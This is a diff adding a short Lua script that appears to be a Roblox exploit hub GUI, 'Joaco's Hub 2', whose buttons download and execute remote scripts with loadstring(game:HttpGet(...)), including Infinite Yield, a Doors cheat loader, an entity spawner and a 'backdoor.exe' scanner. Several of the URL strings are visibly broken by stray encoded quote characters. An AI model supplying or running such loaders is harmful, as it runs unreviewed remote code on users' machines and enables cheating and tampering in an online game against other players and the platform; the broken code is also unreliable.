@@ -1,0 +1,20 @@
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+local Window = Library.CreateLib("Joaco's Hub 2", "Synapse")
+local Tab = Window:NewTab("Scripts")
+local Section = Tab:NewSection("GODLIKE's scripts")
+
+Section:NewButton("Doors op crocs", "Soo op croocs", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/RegularVynixu/Vynixius/main/Loader.lua%22))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/joaquin-wb/Joaco-Roblox-Doors-entity/main/Joaco's%20entity%20spawner))()
+end)
+
+Section:NewButton("Infinite yield", "OP admin", function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source%27))()
+end)
+
+Section:NewButton("Backdoor checker", "Scan a backdoor ingame", function()
+    loadstring(game:HttpGet(('https://raw.githubusercontent.com/iK4oS/backdoor.exe/master/source.lua%27),true))()
+end)
+
+Section:NewButton("Joaco's Doors GUI Loader", "A custom doors crocs made by me", function()
+    print("Clicked")
